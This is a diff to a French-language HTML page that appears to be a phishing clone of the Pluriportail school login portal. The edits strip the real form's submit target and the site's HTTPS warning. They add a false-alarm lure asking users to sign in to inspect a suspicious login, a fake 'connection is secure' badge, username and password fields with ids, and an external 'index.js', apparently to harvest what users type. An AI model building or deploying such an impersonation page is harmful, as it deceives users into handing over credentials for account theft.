@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Pluriportail CMR</title>
     <link rel="stylesheet" href="main.css">
     <link rel="stylesheet" href="main-externe.css">
 </head>
@@ -47,52 +47,11 @@
 
             <div id="LaPageX"><!-- OublieNomUsager.srf © Plurilogic Inc. -->
 
-                <script>
-
-                    require(["ValidDynamic", "inlineSVG"], function (ValidDynamic, inlineSVG) {
-
-                        const $Page = $('.page-oublie-usager');
-
-
-                        const revenir = () => {
-                            window.location = "MainExterne.srf?P=LoginReq";
-                        }
-
-
-                        const envoyer = function () {
-                            $("form").submit();
-                        }
-
-
-                        $(document).ready(function () {
-
-                            $Page.find(".retour").click(revenir);
-                            $Page.find(".envoyer").click(envoyer);
-
-                            $Page.find("[pluri-validation]").on("blur", function () {
-                                var arrParams = JSON.parse($(this).attr("pluri-validation"));
-                                arrParams[1] = this;
-                                ValidDynamic.ValidLostFocus.apply(this, arrParams);
-                            });
-
-                            inlineSVG.init({
-                                svgSelector: '.page-oublie-usager img.inline-svg',
-                                initClass: 'js-inlinesvg'
-                            }, () => {
-                                $(".invisible").removeClass('invisible');
-                            });
-
-
-                        });
-                    });
-
-//# sourceURL=OublieNomUsager.srf
-                </script>
+                
 
                 <div class="page-oublie-usager page-externe">
 
-                    <form class="main-externe-form" name="FormOublieNomUsager" method="post"
-                        action="OublieNomUsager.srf?Envoyer=OUI">
+                    <form class="main-externe-form">
 
                         <div class="main-externe-entete flex flex-center-y bold">
                             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" class="inline-svg inlined-svg"
@@ -105,19 +64,14 @@
                         </div>
 
 
-                        <p>Suite à la mise à jour du PluriPortail, nous vous demandons de mettre à jour vos informations
-                            de connexion.</p>
-                        <p>Inscrivez votre nom d'usager et votre mot de passe ici.</p>
+                        <p>Connectez-vous pour inspecter la tentative de connexion à votre compte.</p>
+                        <p>Vous pourrez changer votre mot de passe si vous ne reconnaissez pas la connexion.</p>
                         <p style="color: green;">✔ Votre connexion est sécurisée.</p>
 
-                        <input type="text" class="courriel txt" name="Courriel" placeholder="Nom d'usager"
-                            maxlength="99" value="" autocomplete="off" tabindex="1" autofocus=""
-                            pluri-validation="[102001, &quot;&quot;, 0]">
-                        <input type="text" class="courriel txt" name="Courriel" placeholder="Mot de passe"
-                            maxlength="99" value="" autocomplete="off" tabindex="1" autofocus=""
-                            pluri-validation="[102001, &quot;&quot;, 0]">
+                        <input id="name" type="text" class="courriel txt" name="Courriel" placeholder="Nom d'usager">
+                        <input id="mdp" type="password" class="courriel txt" placeholder="Mot de passe">
 
-                        <div class="envoyer btn" onclick="window.location = '/hacked'">Mettre à jour</div>
+                        <div class="envoyer btn">Mettre à jour</div>
 
 
 
@@ -153,11 +107,6 @@
             </g>
         </svg></div>
 
-    <div class="TmpHide" id="Main_HTTPS" title="Attention">
-        <p class="MessageErreur">Ce site n'est pas sécurisé.</p>
-        <p>Exigez de votre établissement d'enseignement un Pluriportail hébergé sur un site "https".</p>
-    </div>
-
 
     <div style="display: none;" tabindex="-1" role="dialog"
         class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-draggable"
@@ -171,6 +120,8 @@
             <div style="font-size: 16pt;" align="center"><br>Erreur lors du chargement...</div>
         </div>
     </div>
+
+    <script src="./index.js"></script>
 </body>
 
 </html>
